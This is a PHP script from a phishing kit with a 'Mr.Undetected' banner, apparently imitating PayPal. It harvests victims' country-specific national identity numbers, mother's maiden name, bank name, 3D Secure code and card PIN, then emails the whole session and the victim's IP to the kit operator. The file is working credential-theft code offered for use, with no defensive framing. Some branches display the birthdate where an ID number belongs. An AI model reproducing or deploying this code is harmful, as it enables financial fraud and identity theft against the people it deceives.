<?php
//#     #            #     #                                                              #     #   #   
//##   ## #####      #     # #    # #####  ###### ##### ######  ####  ##### ###### #####  #     #  ##   
//# # # # #    #     #     # ##   # #    # #        #   #      #    #   #   #      #    # #     # # #   
//#  #  # #    #     #     # # #  # #    # #####    #   #####  #        #   #####  #    # #     #   #   
//#     # #####  ### #     # #  # # #    # #        #   #      #        #   #      #    #  #   #    #   
//#     # #   #  ### #     # #   ## #    # #        #   #      #    #   #   #      #    #   # #     #   
//#     # #    # ###  #####  #    # #####  ######   #   ######  ####    #   ###### #####     #    ##### 

include("system.php");
include '../../email.php';
include("function.php");

if(trim($_SESSION['country1']) == "United States"){
$_SESSION['_SSN_']      = $_POST['SSN'];
$xhack_3dscrityscty .= '
<h1><p>Social Security Number :<a>'.$_SESSION['_SSN_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "Canada"){
$_SESSION['_sin_']      = $_POST['sin'];
$xhack_3dscrityscty .= '<h1><p>Soci&#97;l Insur&#97;nce Number :<a>'.$_SESSION['_birthdate_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "United Kingdom"){
$_SESSION['_NIN_']      = $_POST['NIN'];
$xhack_3dscrityscty .= '
<h1><p>N&#97;tional Insur&#97;nce Number :<a>'.$_SESSION['_birthdate_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "Italy"){
$_SESSION['_FCN_']      = $_POST['FCN'];
$xhack_3dscrityscty .= '
<h1><p>Fiscal Code Number :<a>'.$_SESSION['_birthdate_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "Ireland"){
$_SESSION['_irpps_']      = $_POST['irpps'];
$_SESSION['_mmn_']      = $_POST['mmn'];
$xhack_3dscrityscty .= '
<h1><p>Personal Public Service Number :<a>'.$_SESSION['_irpps_'].'</p></a></h1>
<h1><p>Mother M&#97;iden Name :<a>'.$_SESSION['_mmn_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "Brazil"){
$_SESSION['_cpfbr_']      = $_POST['cpfbr'];
$xhack_3dscrityscty .= '
<h1><p>CPF Number :<a>'.$_SESSION['_cpfbr_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "Netherlands"){
$_SESSION['_BSN_']      = $_POST['BSN'];
$xhack_3dscrityscty .= '
<h1><p>Citizen Service Number/SOFI :<a>'.$_SESSION['_BSN_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "Spain"){
$_SESSION['_DNI_']      = $_POST['DNI'];
$xhack_3dscrityscty .= '
<h1><p>National Identity Document Number :<a>'.$_SESSION['_DNI_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "Sweden"){
$_SESSION['_SID_']      = $_POST['SID'];
$xhack_3dscrityscty .= '
<h1><p>Personal Identity Number :<a>'.$_SESSION['_SID_'].'</p></a></h1>'; }
if(trim($_SESSION['country1']) == "Australia"){
$_SESSION['_OSID_']      = $_POST['OSID'];
$xhack_3dscrityscty .= '
<h1><p>Online Shopping ID :<a>'.$_SESSION['_OSID_'].'</p></a></h1>'; }

$_SESSION['_namebank_']      = $_POST['namebank'];
$_SESSION['_DSecure_']     = $_POST['DSecure'];
$_SESSION['_CardPIN_']        = $_POST['CardPIN'];

$ip=$_SESSION['ip']=getip();
$subject=$_SESSION['subject']=" PPL Fulls 3d Card | ".$ip."" . "\r\n";
send($_SESSION,$to,$subject) ; 

?>